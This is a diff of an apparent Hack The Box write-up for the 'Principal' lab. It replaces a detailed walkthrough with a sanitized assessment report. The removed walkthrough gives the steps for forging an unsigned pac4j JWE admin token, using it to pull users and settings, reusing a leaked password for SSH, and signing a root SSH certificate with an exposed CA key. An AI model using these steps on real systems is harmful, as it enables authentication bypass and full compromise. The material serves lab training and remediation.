@@ -1,170 +1,100 @@
-<div align="center">
+# Principal — Security Assessment
 
-# 🔐 HTB: Principal
+| Field | Value |
+| --- | --- |
+| Platform | Hack The Box |
+| Operating system | Linux |
+| Difficulty | Medium |
+| Assessment date | 2026-03-27 (from existing notes; timezone not recorded) |
+| Author | Dylan Senez / d4rkgunn3r |
+| Review status | Proposed revision; publication eligibility and evidence review pending |
 
-![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
-![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
-![Cert](https://img.shields.io/badge/Track-CPTS-blue?style=flat-square)
+## 1. Executive summary
 
-`hackthebox` `linux` `jwt` `cve-2026-29000` `pac4j` `ssh-certificate-auth`
+The notes report authentication acceptance of a forged token, sensitive settings disclosure, service-account SSH access, and misuse of an exposed SSH certificate-authority key.
 
-</div>
+## 2. Scope and authorization
 
----
+This account concerns the assigned HTB laboratory target only. Target addresses, VPN information, secrets, and flag contents are excluded. This revision analyzes recorded work; no assessment commands were executed during the editorial review. Machine retirement status has not been freshly verified.
 
-> **TL;DR** — A JWT/JWE auth library (pac4j) has a public JWKS endpoint and a known bypass that lets you forge an admin token signed with `alg=none`. That token unlocks an internal API which leaks an SSH signing key. Forge your own certificate off that CA, and you're root.
+## 3. Methodology and reproducibility
 
-## 📋 Box Info
+Discovery → service analysis → recorded access path → privilege/impact assessment → evidence review → remediation. Commands below support authorized discovery and identity verification. Exploitation is described at the finding level; operational payloads and secret-extraction procedures are omitted.
 
-| | |
-|---|---|
-| 🖥️ **OS** | Linux |
-| 🎯 **Target** | `<TARGET_IP>` |
-| 🎚️ **Difficulty** | Medium |
-| 📅 **Date** | March 27, 2026 |
-| 🏁 **Outcome** | ✅ Full compromise |
-
-## 🔍 Recon
+Set the address of the currently assigned lab instance before discovery:
 
 ```bash
-nmap -sVC -p- <TARGET_IP> -T3 --min-rate 5000
+export TARGET_IP='REPLACE_WITH_ASSIGNED_LAB_IP'
+mkdir -p evidence/principal/{scans,screenshots}
+nmap -sV -p 22,8080 -oA evidence/principal/scans/services "$TARGET_IP"
 ```
 
-| Port | Service | Notes |
-|:---:|---|---|
-| `22` | ssh | OpenSSH 9.6p1 (Ubuntu) |
-| `8080` | http | Jetty, "Principal Internal Platform - Login" |
+This is a proposed targeted confirmation command, not the original full-port scan. Nmap creates traffic and local output files. Record tool versions, instance date, and timezone; compare results with the observations below rather than assuming the same services are still present.
 
-The login page redirects to `/login`, and the response headers immediately give away the stack:
+## 4. Reconnaissance and service analysis
 
-```
-X-Powered-By: pac4j-jwt/6.0.3
-```
+22 OpenSSH 9.6p1; 8080 Jetty; a response header identifies pac4j-jwt/6.0.3. A public JWKS endpoint is not itself a vulnerability.
 
-**pac4j** is a Java security/auth engine. Version 6.0.3 rang a bell — worth checking for known bugs before touching anything else.
+> **EV-001 — Evidence placeholder:** add the reviewed service-scan excerpt and screenshot here. Remove sensitive identifiers. No screenshot file is claimed to exist at this placeholder.
 
----
+## 5. Recorded initial-access path
 
-## 🚩 Foothold — Forged Admin Token
+The existing narrative reports unsigned inner-token acceptance and privileged API access, followed by a disclosed service credential accepted for SSH. CVE attribution and affected releases require primary-source verification.
 
-### The stack, mapped out
+> **EV-002 — Evidence placeholder:** add a sanitized artifact establishing the behavior and resulting identity. An HTTP success response or tool success message alone does not prove code execution.
 
-Pulling the client JS bundle from `/login` reveals the shape of the auth flow:
+## 6. Privilege escalation and impact validation
 
-- `POST /api/auth/login` → returns `data.token`
-- Token format: **JWE** (`RSA-OAEP-256` + `A128GCM`) wrapping an inner **JWT** signed `RS256`
-- Public keys exposed at `GET /api/auth/jwks`
-- API surface: `/api/dashboard`, `/api/users`, `/api/settings`
-- Roles: `ROLE_ADMIN`, `ROLE_MANAGER`, `ROLE_USER`
+The service account reportedly could read an SSH user-CA signing key. A certificate issued using that key was accepted for root authentication. The trust boundary failed at CA-key custody and permitted principal mapping.
 
-> 💡 **Why the JWKS endpoint matters:** it's meant to expose the *encryption* public key so clients can wrap requests — not to hand an attacker a target for forgery. But combined with a signature-validation bug, it becomes exactly that.
+In an already authorized session, record identity without reading objective contents:
 
 ```bash
-GET /api/auth/jwks
+id
+hostname
+sudo -l
 ```
 
-```json
-{
-  "keys": [{ "kid": "enc-key-1", "kty": "RSA", "e": "AQAB", "n": "<modulus>" }]
-}
-```
+These are proposed identity-verification commands, not a claim of rerunning the assessment. Windows privilege enumeration does not prove successful elevation; Linux sudo policy alone does not prove a root session.
 
-### CVE-2026-29000 — pac4j-jwt 6.0.3 verification bypass
+> **EV-003 — Evidence placeholder:** add policy/permission evidence and the resulting identity or access proof. Never include flags, tokens, private keys, hashes of credentials, or password values.
 
-pac4j-jwt 6.0.3 has a bug that lets an attacker present an **unsigned** (`alg=none`) inner JWT wrapped in a validly-encrypted JWE, and have it accepted as authentic. In other words: encrypt correctly, sign not at all.
+## 7. Evidence register and limitations
 
-```bash
-python3 pac4j-exploit.py -u http://<TARGET_IP>:8080
-```
+| ID | Required artifact | Current status |
+| --- | --- | --- |
+| EV-001 | Service inventory and timestamped scan excerpt | Text observations available; original artifact review pending |
+| EV-002 | Initial-access behavior and identity proof | Existing narrative reviewed; sanitized artifact pending |
+| EV-003 | Privilege boundary and impact proof | Reported in narrative; original artifact review pending |
 
-The exploit:
-1. Fetches `/api/auth/jwks`, grabs the RSA public key (`kid: enc-key-1`)
-2. Forges a JWE containing an **unsigned** inner JWT with claims: `sub=admin`, `role=ROLE_ADMIN`, `iss=principal-platform`
-3. Confirms access: `GET /api/dashboard` → `200 OK`, full platform stats
+Root authentication reported; private key, credential, and token contents excluded.
 
-Dashboard activity logs immediately hint at the next step — `CERT_ISSUED` events for `svc-deploy` referencing SSH certificate issuance.
+The source is [the existing repository note](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/principal.md), reviewed at blob SHA `aab1003dc065a11bce7d52fc45d407978ee4d99e`, plus [the repository source review](./EVIDENCE-REVIEW.md). 
 
-### Pulling the user directory and app secrets
+A Rooted status is not a substitute for a terminal transcript. Reported results are attributed to the existing notes; they have not been independently reproduced in this review. CVE numbers, fixed-version claims, unsupported timing claims, and numerical severity scores are withheld where primary-source verification is missing.
 
-```bash
-curl -s http://<TARGET_IP>:8080/api/users -H "Authorization: Bearer <forged_token>"
-```
+## 8. Findings and remediation
 
-Eight accounts total. Two stand out:
-- `admin` — `ROLE_ADMIN`, IT Security
-- `svc-deploy` — deployer role, *"Service account for automated deployments via SSH certificate auth"*
+| ID | Finding / review target | Remediation |
+| --- | --- | --- |
+| F-001 | Token verification failure | Require valid signatures and approved algorithms; validate issuer, audience, expiry, and role mapping; apply supported vendor fixes. |
+| F-002 | Secrets in settings API | Remove secrets from responses; authorize configuration access and rotate exposed credentials. |
+| F-003 | SSH CA key exposure | Revoke compromised trust, rotate the CA, restrict principals, and isolate signing material from application accounts. |
 
-```bash
-curl -s http://<TARGET_IP>:8080/api/settings -H "Authorization: Bearer <forged_token>"
-```
+Prioritize the boundary failures that enable access or elevation. Set final severity after confirming prerequisites, affected privileges, and original evidence.
 
-The settings API dumps the full security config, including:
+## 9. Detection opportunities
 
-```
-encryptionKey: D3pl0y_$$H_Now42!
-SSH certificate auth: enabled
-SSH CA path: /opt/principal/ssh/
-```
+Token-validation anomalies; sensitive settings access; service-account logons; unusual SSH certificate principals/key IDs. Tune for legitimate automated deployment.
 
-That's not just an app secret — it doubles as `svc-deploy`'s SSH password.
+Collect relevant application, authentication, process, and file-change logs. Correlate events by account, host, and time; a single suspicious request is not proof of successful compromise. These are detection proposals, not tested rules or observed telemetry.
 
-```bash
-ssh svc-deploy@<TARGET_IP>
-# password: D3pl0y_$$H_Now42!
-```
+## 10. Remediation validation
 
-```
-svc-deploy@principal:~$ cat user.txt
-<USER_FLAG_REDACTED>
-```
+Verify corrected permissions and authentication/authorization policy using approved test accounts and administrative configuration review. Confirm exposed secrets were rotated and removed from distributed artifacts. Validate that legitimate workflows still function and monitoring captures permitted test activity. Preserve before/after evidence without exposing sensitive values.
 
----
+## 11. Lessons learned and remaining work
 
-## 👑 Root — Forging an SSH Certificate
+Use observed identities and access results to establish impact. Keep service exposure separate from validated weaknesses and distinguish suggested methods from executed steps. Before publication, resolve the gaps in Sections 5–7, verify platform permission, and review every image and output for secrets.
 
-### The CA key is sitting right there
-
-```bash
-svc-deploy@principal:~$ cat /opt/principal/ssh/*
-```
-
-That directory holds the **SSH User CA private key** — the same CA the settings API told us to look for. This key is what the server uses to sign valid user certificates. Whoever holds it can mint a certificate for *any* principal, including `root`.
-
-> ⚠️ **Root cause:** an SSH CA private key lives in a directory readable by a service account that was reachable via a forged auth token. Certificate-based SSH auth is only as strong as the CA key's custody.
-
-### Sign your own root certificate
-
-```bash
-ssh-keygen -t rsa -b 4096 -f root_key -N "" -C "root@principal"
-ssh-keygen -s ca_key -I "root-cert" -n root -V +1h -z 1 root_key.pub
-```
-
-That produces `root_key-cert.pub` — a certificate for principal `root`, signed by the real CA, valid for one hour.
-
-```bash
-ssh -i root_key root@localhost
-```
-
-```
-root@principal:~# cat root.txt
-<ROOT_FLAG_REDACTED>
-```
-
----
-
-## 🛠️ Remediation
-
-| Weakness | Fix |
-|---|---|
-| pac4j-jwt 6.0.3 signature bypass | Upgrade to a patched pac4j release; never trust `alg=none` on the receiving end. |
-| Settings API exposing `encryptionKey` to any authenticated (or forged) session | Scope config endpoints to true admins only; never return secrets meant for internal service auth over a general API. |
-| SSH CA private key readable by a low-privilege service account | Store CA key material on a hardened signing host, not on the app server; restrict filesystem permissions to the signing service only. |
-
----
-
-<div align="center">
-
-*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*
-
-</div>
+[Back to walkthrough inventory](./README.md)
